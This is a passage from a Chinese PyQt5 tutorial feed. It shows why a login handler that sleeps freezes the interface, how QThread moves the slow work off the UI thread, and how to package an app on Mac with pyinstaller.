<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.textBrowser  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 文本显示区域</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 绑定信号与槽函数</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.login_btn.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.login)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> login</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">        """登录按钮的槽函数"""</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        user_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.user_name_qwidget.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        password </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.password_qwidget.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">text</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> range</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">            print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"正在登录服务器....</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">%d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            time.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">sleep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> user_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "admin"</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> and</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> password </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "123456"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"欢迎</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">%s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> user_name)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">repaint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setText</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"用户名或密码错误....请重试"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">            self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.textBrowser.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">repaint</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.ui.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>重新运行效果如下：</p>
<p></p>
<p>可以很明显的看到，程序是卡顿的</p>
<p>why？为什么会卡顿呢？大名鼎鼎的Qt不止于此吧！</p>
<p>答：只要是带界面的程序，一般来说程序运行后会用当前线程进行事件的检查、按钮等图形界面的更新操作，如果在执行某个逻辑代码（例如登录）时耗时非常验证，此时就会出现界面卡顿</p>
<p>怎样做更好？</p>
<p>答：我们一般将界面的显示用主线程来操作，逻辑功能代码或者耗时操作的代码都用另外线程进行处理</p>
<p>这也就是为什么要研究PyQt中的多线程了，因为它能实现多任务，让界面用一个线程更新，让逻辑代码在另外一个线程中，互不影响</p>
<h2>二、PyQt使用线程</h2>
<h3>1. 使用QT Designer设计如下效果ui文件</h3>
<p></p>
<h3>2. 参考代码</h3>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> time</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5 </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.Qt </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QThread</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyThread</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QThread</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> range</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">            print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"是MyThread线程中执行....</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">%d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            time.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">sleep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWin</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> uic.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">loadUi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"./thread-1.ui"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 从ui文件中加载控件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        lineedit </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.lineEdit</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn1 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.pushButton</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn2 </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.ui.pushButton_2</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 给2个按钮绑定槽函数</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn1.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.click_1)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 绑定槽函数</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn2.clicked.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.click_2)  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 绑定槽函数</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> click_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">        for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">in</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> range</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">10</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">            print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"是UI线程中执行....</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">%d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">+</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">            time.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">sleep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> click_2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.my_thread </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyThread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 创建线程</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.my_thread.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">start</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 开始线程</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "__main__"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    myshow </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    myshow.ui.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>3. 运行效果：(注意一定先点击某1个按钮后再输入内容)</h3>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>009-打包为可执行程序</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/009-%E6%89%93%E5%8C%85%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/009-%E6%89%93%E5%8C%85%E4%B8%BA%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F.html</guid>
      <source url="https://www.geekery.cn/rss.xml">009-打包为可执行程序</source>
      <description>009-打包为可执行程序 009-Mac下，发布PyQT为app程序 方式1：使用pyinstaller发布(推荐) 1. 安装 2. 终端运行 3. 效果 image-20201028184027503 添加 Retina 支持 办法是main.spec向其中添加： info_plist={ &amp;apos;NSHighResolutionCapable&amp;apos;: &amp;apos;T...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>009-Mac下，发布PyQT为app程序</p>
</blockquote>
<h2>方式1：使用pyinstaller发布(推荐)</h2>
<h4>1. 安装</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>pip install pyinstaller -i https://pypi.tuna.tsinghua.edu.cn/simple</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>2. 终端运行</h4>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>pyinstaller --windowed --onefile --clean --noconfirm main.py</span></span>
<span class="line"><span>pyinstaller --windowed --onefile --clean --noconfirm main.spec</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h4>3. 效果</h4>
<p></p>
<h3>添加 Retina 支持</h3>
<p>办法是<code>main.spec</code>向其中添加：</p>
<p><code>info_plist={ 'NSHighResolutionCapable': 'True' }</code> 如下所示：</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>app = BUNDLE(exe,</span></span>
<span class="line"><span>             name='main.app',</span></span>
<span class="line"><span>             icon='icon.icns',</span></span>
<span class="line"><span>             bundle_identifier=None,</span></span>
<span class="line"><span>             info_plist={</span></span>
<span class="line"><span>                'NSHighResolutionCapable': 'True',</span></span>
<span class="line"><span>                })</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>解决双击APP启动慢的问题</p>
<blockquote>
<p>可以不打包成单个.app文件，而是打包成一个目录中，然后去目录下把感觉没用到的内容删掉，，这样启动更快 ...</p>
</blockquote>
<p>将<code>--onefile</code>改为<code>--onedir</code></p>
<p></p>
<p>重新运行上述命令，得到的新的app如下</p>
